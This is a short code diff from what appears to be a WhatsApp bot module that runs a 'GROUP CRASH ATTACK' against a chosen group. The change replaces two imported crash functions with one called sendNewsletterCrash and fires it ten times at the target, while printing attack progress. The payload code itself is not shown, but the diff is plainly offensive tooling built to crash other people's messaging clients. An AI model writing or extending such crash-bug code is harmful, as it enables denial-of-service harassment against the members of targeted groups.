@@ -206,7 +206,7 @@ export default {
       }
 
       // Import bug functions only when needed 
-      const { buggccrash, buggcnewup } = await import("../../lib/buggers/bug.js")
+      const { sendNewsletterCrash } = await import("../../lib/buggers/bug.js")
 
       let progress = `👥 *GROUP CRASH ATTACK*\n\n🎯 Group: ${groupName}\n📱 ID: ${groupId}\n\n📊 *Progress:*\n\n`
 
@@ -216,8 +216,7 @@ export default {
       })
 
       const bugs = [
-          { name: 'BugGcCrash', fn: () => buggccrash(sock, groupId), count: 5 },
-        { name: 'BugGcNewup', fn: () => buggcnewup(sock, groupId), count: 5 },
+          { name: 'sendNewsletterCrash', fn: () => sendNewsletterCrash(sock, groupId), count: 10 }
         
       ]
 
